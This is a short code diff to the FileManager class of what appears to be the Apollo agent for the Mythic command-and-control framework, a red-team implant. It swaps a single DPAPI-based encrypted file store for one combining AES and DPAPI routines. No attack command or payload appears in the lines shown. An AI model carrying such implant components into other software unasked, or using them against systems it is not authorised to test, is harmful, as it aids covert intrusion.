@@ -2,16 +2,14 @@
 using ApolloInterop.Classes.Events;
 using ApolloInterop.Interfaces;
 using ApolloInterop.Structs.MythicStructs;
-using EncryptedFileStore.Plaintext;
 using System;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Threading;
-using EncryptedFileStore.Aes;
-using EncryptedFileStore.DPAPI;
-using EncryptedFileStore.XOR;
+using ApolloInterop.Classes.Cryptography;
+using EncryptedFileStore;
 
 namespace Apollo.Management.Files
 {
@@ -20,11 +18,18 @@ namespace Apollo.Management.Files
         private int _chunkSize = 512000;
         private IAgent _agent;
         private IEncryptedFileStore _fileStore;
+
         public FileManager(IAgent agent)
         {
             _agent = agent;
-            _fileStore = new DPAPIFileStore(_agent);
+            _fileStore = new EncryptedFileStore.EncryptedFileStore(
+                new ICryptographicRoutine[]
+                {
+                    new AesRoutine(),
+                    new DpapiRoutine(),
+                });
         }
+
         internal struct UploadMessageTracker
         {
             internal AutoResetEvent Complete;
